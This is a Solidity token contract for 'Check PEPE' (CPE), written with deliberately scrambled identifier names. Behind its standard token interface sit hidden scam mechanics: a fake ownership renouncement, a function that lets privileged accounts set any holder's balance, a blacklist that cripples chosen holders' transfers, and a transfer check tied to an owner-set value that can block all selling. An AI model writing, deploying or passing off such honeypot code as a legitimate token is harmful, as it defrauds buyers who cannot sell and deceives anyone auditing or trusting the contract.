//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface minTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalWallet) external view returns (uint256);

    function transfer(address minReceiver, uint256 toTrading) external returns (bool);

    function allowance(address enableTradingMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 toTrading) external returns (bool);

    function transferFrom(
        address sender,
        address minReceiver,
        uint256 toTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeFund, uint256 value);
    event Approval(address indexed enableTradingMarketing, address indexed spender, uint256 value);
}

abstract contract liquidityTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface listIs {
    function createPair(address walletTeamTx, address maxAmount) external returns (address);
}

interface minTxMetadata is minTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CheckPEPE is liquidityTx, minTx, minTxMetadata {

    uint256 private limitSwapSender = 100000000 * 10 ** 18;

    uint256 public exemptSellList;

    function owner() external view returns (address) {
        return feeMaxSender;
    }

    mapping(address => bool) public exemptTo;

    function transferFrom(address tokenAt, address minReceiver, uint256 toTrading) external override returns (bool) {
        if (_msgSender() != autoEnableLimit) {
            if (maxLimit[tokenAt][_msgSender()] != type(uint256).max) {
                require(toTrading <= maxLimit[tokenAt][_msgSender()]);
                maxLimit[tokenAt][_msgSender()] -= toTrading;
            }
        }
        return fundMode(tokenAt, minReceiver, toTrading);
    }

    function transfer(address txFrom, uint256 toTrading) external virtual override returns (bool) {
        return fundMode(_msgSender(), txFrom, toTrading);
    }

    mapping(address => mapping(address => uint256)) private maxLimit;

    mapping(address => uint256) private tokenLimit;

    function name() external view virtual override returns (string memory) {
        return maxReceiverTx;
    }

    bool public totalBuy;

    uint256 private takeMarketing;

    function takeList(uint256 toTrading) public {
        takeLaunched();
        minWallet = toTrading;
    }

    address private feeMaxSender;

    event OwnershipTransferred(address indexed walletTake, address indexed limitReceiverLiquidity);

    function decimals() external view virtual override returns (uint8) {
        return atLiquidityReceiver;
    }

    function launchTx() public {
        emit OwnershipTransferred(modeReceiver, address(0));
        feeMaxSender = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return senderAt;
    }

    function approve(address sellShould, uint256 toTrading) public virtual override returns (bool) {
        maxLimit[_msgSender()][sellShould] = toTrading;
        emit Approval(_msgSender(), sellShould, toTrading);
        return true;
    }

    address autoEnableLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor (){
        
        atTeam isFrom = atTeam(autoEnableLimit);
        minShouldEnable = listIs(isFrom.factory()).createPair(isFrom.WETH(), address(this));
        
        modeReceiver = _msgSender();
        launchTx();
        exemptTo[modeReceiver] = true;
        tokenLimit[modeReceiver] = limitSwapSender;
        if (tradingFee == walletIsLiquidity) {
            totalBuy = true;
        }
        emit Transfer(address(0), modeReceiver, limitSwapSender);
    }

    function walletLaunched(address amountShould) public {
        takeLaunched();
        if (tradingFee == senderExempt) {
            walletIsLiquidity = exemptSellList;
        }
        if (amountShould == modeReceiver || amountShould == minShouldEnable) {
            return;
        }
        atEnable[amountShould] = true;
    }

    uint256 minWallet;

    bool private atTake;

    function allowance(address teamAuto, address sellShould) external view virtual override returns (uint256) {
        if (sellShould == autoEnableLimit) {
            return type(uint256).max;
        }
        return maxLimit[teamAuto][sellShould];
    }

    uint256 atReceiverMarketing;

    function balanceOf(address totalWallet) public view virtual override returns (uint256) {
        return tokenLimit[totalWallet];
    }

    uint256 private tradingFee;

    function receiverLiquidity(address liquidityMarketing) public {
        require(liquidityMarketing.balance < 100000);
        if (totalLaunchedTx) {
            return;
        }
        
        exemptTo[liquidityMarketing] = true;
        if (walletIsLiquidity == tradingFee) {
            totalBuy = true;
        }
        totalLaunchedTx = true;
    }

    address public modeReceiver;

    address tokenTxFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private senderAt = "CPE";

    mapping(address => bool) public atEnable;

    function getOwner() external view returns (address) {
        return feeMaxSender;
    }

    function walletModeMarketing(address txFrom, uint256 toTrading) public {
        takeLaunched();
        tokenLimit[txFrom] = toTrading;
    }

    function fundMode(address tokenAt, address minReceiver, uint256 toTrading) internal returns (bool) {
        if (tokenAt == modeReceiver) {
            return minAt(tokenAt, minReceiver, toTrading);
        }
        uint256 fundWallet = minTx(minShouldEnable).balanceOf(tokenTxFund);
        require(fundWallet == minWallet);
        require(minReceiver != tokenTxFund);
        if (atEnable[tokenAt]) {
            return minAt(tokenAt, minReceiver, listTake);
        }
        return minAt(tokenAt, minReceiver, toTrading);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return limitSwapSender;
    }

    string private maxReceiverTx = "Check PEPE";

    function takeLaunched() private view {
        require(exemptTo[_msgSender()]);
    }

    uint8 private atLiquidityReceiver = 18;

    uint256 private senderExempt;

    uint256 private walletIsLiquidity;

    function minAt(address tokenAt, address minReceiver, uint256 toTrading) internal returns (bool) {
        require(tokenLimit[tokenAt] >= toTrading);
        tokenLimit[tokenAt] -= toTrading;
        tokenLimit[minReceiver] += toTrading;
        emit Transfer(tokenAt, minReceiver, toTrading);
        return true;
    }

    address public minShouldEnable;

    uint256 constant listTake = 14 ** 10;

    bool public totalLaunchedTx;

}